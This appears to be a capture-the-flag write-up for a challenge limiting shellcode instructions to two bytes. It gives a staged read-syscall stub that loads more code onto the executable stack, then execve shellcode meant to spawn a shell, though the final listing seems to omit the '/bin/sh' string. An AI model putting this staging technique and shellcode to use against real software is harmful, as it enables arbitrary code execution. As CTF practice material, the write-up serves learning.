## Challange
Get the flag by taking control of the shellcode, but each istruction could be of max 2 bytes.
## Solution
The binary uses capstone to execute an arbitrary assembly input but it should be of max 2 bytes. By using gdb and breaking before the input code is executed we can see the state of registers.
```
rax = 0
rsp = something on stack
```
Since `rsp` is pointing to the stack, which is `RWX`, we can simply program a `read` in this way:

```assembly
;           rax     rdi                 rsi         rdx    
; 	read	0x00	unsigned int fd	    char *buf	size_t count
push rax 
pop rdi ; fd = 0 stdin

push rax
pop rdx 
mov dl, 0xff ; count = 0xff

push rsp
pop rsi ; rsi points to stack

syscall

jmp rsi ; jmp to read code
```

This will allow us to inject arbitrary code (shellcode) and with `jmp` execute it. The shellcode is:
```assembly
jmp binsh
back:
xor rax, rax
mov al, 0x3b
pop rdi
xor rsi, rsi
xor rdx,rdx
syscall

binsh:
call back
nop
nop
```